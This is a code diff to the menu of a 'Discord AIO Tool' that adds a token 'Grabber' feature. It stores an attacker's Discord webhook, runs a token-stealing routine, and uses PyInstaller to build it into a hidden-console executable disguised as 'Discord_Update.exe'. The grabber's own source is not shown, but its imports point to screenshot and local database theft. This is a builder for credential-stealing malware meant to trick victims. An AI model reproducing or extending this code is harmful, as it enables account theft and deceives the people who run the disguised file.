@@ -12,6 +12,7 @@ from colorama import Fore, Style, init
 from utils.update import main as run_updater
 from utils.nitro_generator import run_nitro_generator
 from utils.token_generator import run_token_generator
+from utils.grabber import get_token
 
 # Initialize colorama
 init()
@@ -98,21 +99,38 @@ def get_grbr_webhook():
     except Exception:
         return None
 
+def save_grbr_webhook(webhook_url):
+    storage_path = os.path.join(os.getenv('APPDATA'), 'gruppe_storage')
+    config_path = os.path.join(storage_path, 'config.json')
+    
+    if not os.path.exists(storage_path):
+        os.makedirs(storage_path)
+    
+    config = {}
+    if os.path.exists(config_path):
+        try:
+            with open(config_path, 'r', encoding='utf-8') as f:
+                config = json.load(f)
+        except Exception:
+            pass
+    
+    config['webhook'] = webhook_url
+    
+    with open(config_path, 'w', encoding='utf-8') as f:
+        json.dump(config, f)
+    
+    return True
+
 def show_webhook_box():
-    box_color = rgb(0, 255, 0)
     text_color = rgb(255, 255, 255)
-    url = "No webhook set"
-    max_url_len = 35
-    if len(url) > max_url_len:
-        url = url[:15] + '...' + url[-15:]
-    width = 50
-    padding = (width - len(url)) // 2
-    top = box_color + center("╔" + "═" * (width - 2) + "╗") + RESET
-    url_line = box_color + center("║" + " " * padding + text_color + url + " " * (width - 2 - padding - len(url)) + box_color + "║") + RESET
-    bot = box_color + center("╚" + "═" * (width - 2) + "╝") + RESET
-    print(top)
-    print(url_line)
-    print(bot)
+    webhook = get_grbr_webhook()
+    if webhook:
+        status = "Webhook Set"
+    else:
+        status = "No Webhook Set"
+    
+    print(text_color + center(status) + RESET)
+    print()
 
 BANNER = [
     "_______________________________   ___________________  _____      _____      _____  _____________________ ",
@@ -144,6 +162,9 @@ def print_banner(show_webhook=False):
     print(rgb(255,64,64) + center("Discord AIO Tool 2025") + RESET)
     print()
     show_status()
+    if show_webhook:
+        print()
+        show_webhook_box()
     print()
 
 
@@ -378,9 +399,165 @@ def server_cloner_menu():
 def webhook_deleter_menu():
     subprocess.run([sys.executable, 'utils/webhook_deleter.py'])
 
+def set_grabber_webhook_menu():
+    global status_message
+    print_banner(show_webhook=True)
+    pretty_print("Grabber Webhook Status:", (255,128,0))
+    webhook_url = clean_singleline_input_left("Enter new Discord Webhook URL for Grabber: ")
+    if webhook_url and webhook_url.strip():
+        if save_grbr_webhook(webhook_url.strip()):
+            status_message = "Grabber webhook set successfully!"
+            pretty_print("✓ Grabber webhook set successfully!", (0,255,0))
+        else:
+            status_message = "Error setting grabber webhook!"
+            pretty_print("✗ Error setting grabber webhook!", (255,0,0))
+    else:
+        status_message = "No webhook URL provided."
+        pretty_print("No webhook URL provided.", (255,64,64))
+
+def compile_grabber_menu():
+    global status_message
+    print_banner()
+    if not get_grbr_webhook():
+        status_message = "No grabber webhook set!"
+        pretty_print("✗ You need to set a grabber webhook first!", (255,0,0))
+        return
+    
+    pretty_print("This will compile the token grabber into an executable (.exe) file", (255,128,0))
+    compile_confirmation = input(rgb(255,32,32) + center("Do you want to continue? (y/n): ") + RESET).lower()
+    
+    if compile_confirmation != 'y':
+        status_message = "Compilation cancelled."
+        pretty_print("Compilation cancelled.", (255,64,64))
+        return
+    
+    # Check for required dependencies
+    missing_deps = []
+    try:
+        __import__('psutil')
+    except ImportError:
+        missing_deps.append("psutil")
+    
+    try:
+        __import__('PIL')
+    except ImportError:
+        missing_deps.append("pillow")
+    
+    try:
+        __import__('sqlite3')
+    except ImportError:
+        missing_deps.append("pysqlite3")
+    
+    if missing_deps:
+        status_message = "Installing required dependencies..."
+        print_banner()
+        pretty_print(f"Installing required dependencies: {', '.join(missing_deps)}", (255,128,0))
+        for dep in missing_deps:
+            try:
+                subprocess.run([sys.executable, '-m', 'pip', 'install', dep], check=True)
+                pretty_print(f"✓ Installed {dep}", (0,255,0))
+            except:
+                pretty_print(f"✗ Failed to install {dep}", (255,0,0))
+                status_message = "Failed to install dependencies."
+                return
+    
+    status_message = "Compiling grabber to .exe..."
+    print_banner()
+    pretty_print("Compiling token grabber to .exe...", (255,128,0))
+    
+    try:
+        # Check if PyInstaller is installed
+        check_cmd = [sys.executable, '-m', 'pip', 'show', 'pyinstaller']
+        result = subprocess.run(check_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        if result.returncode != 0:
+            pretty_print("PyInstaller not found. Installing PyInstaller...", (255,128,0))
+            install_cmd = [sys.executable, '-m', 'pip', 'install', 'pyinstaller']
+            subprocess.run(install_cmd, check=True)
+        
+        loading_spinner()
+        
+        # Use PyInstaller to compile the grabber
+        output_dir = os.path.join(os.getcwd(), 'compiled')
+        if not os.path.exists(output_dir):
+            os.makedirs(output_dir)
+        
+        pretty_print("Building executable with PyInstaller...", (255,128,0))
+        compile_cmd = [
+            sys.executable, '-m', 'PyInstaller',
+            '--onefile',
+            '--noconsole',
+            '--icon=utils/icon.ico',
+            '--name=Discord_Update',
+            '--distpath=' + output_dir,
+            '--hidden-import=PIL._tkinter_finder',
+            '--hidden-import=PIL.Image',
+            '--hidden-import=PIL.ImageGrab',
+            '--hidden-import=psutil',
+            '--hidden-import=sqlite3',
+            'utils/grabber.py'
+        ]
+        
+        # You might want to hide the console output when building
+        subprocess.run(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        status_message = "Grabber compiled successfully!"
+        print_banner()
+        pretty_print("✓ Token grabber compiled successfully!", (0,255,0))
+        pretty_print(f"File saved to: {output_dir}\\Discord_Update.exe", (0,255,128))
+    except Exception as e:
+        status_message = f"Error during compilation: {str(e)}"
+        pretty_print(f"✗ Error during compilation: {str(e)}", (255,0,0))
+
+def grabber_menu():
+    while True:
+        print_banner(show_webhook=True)
+        questions = [
+            inquirer.List('choice',
+                        message="Select a Grabber option:",
+                        choices=[
+                            'Set Webhook',
+                            'Compile to EXE',
+                            'Run Grabber',
+                            'Back to Main Menu'
+                        ]),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['choice'] == 'Back to Main Menu':
+            break
+            
+        if answers['choice'] == 'Set Webhook':
+            set_grabber_webhook_menu()
+        elif answers['choice'] == 'Compile to EXE':
+            compile_grabber_menu()
+        elif answers['choice'] == 'Run Grabber':
+            if not get_grbr_webhook():
+                print_banner()
+                pretty_print("No webhook set! Please set a webhook first.", (255,0,0))
+                continue
+                
+            print_banner()
+            pretty_print("Running token grabber...", (255,128,0))
+            loading_spinner()
+            result = get_token()
+            if result:
+                pretty_print("✓ Token grabber executed successfully!", (0,255,0))
+            else:
+                pretty_print("✗ Token grabber failed to execute. Check your webhook configuration.", (255,0,0))
+            
+        questions = [
+            inquirer.List('continue',
+                        message="Return to Grabber menu?",
+                        choices=['Yes', 'No'],
+                        ),
+        ]
+        answers = inquirer.prompt(questions)
+        if not answers or answers['continue'] == 'No':
+            break
+
 def main_menu():
     while True:
-        print_banner(show_webhook=False)
+        print_banner(show_webhook=True)
         questions = [
             inquirer.List('choice',
                          message="Select a feature:",
@@ -397,6 +574,7 @@ def main_menu():
                              'Theme Spammer',
                              'Server Cloner',
                              'Webhook Deleter',
+                             'Grabber',
                              'Exit'
                          ]),
         ]
@@ -454,6 +632,8 @@ def main_menu():
             server_cloner_menu()
         elif answers['choice'] == 'Webhook Deleter':
             webhook_deleter_menu()
+        elif answers['choice'] == 'Grabber':
+            grabber_menu()
         questions = [
             inquirer.List('continue',
                          message="Return to main menu?",
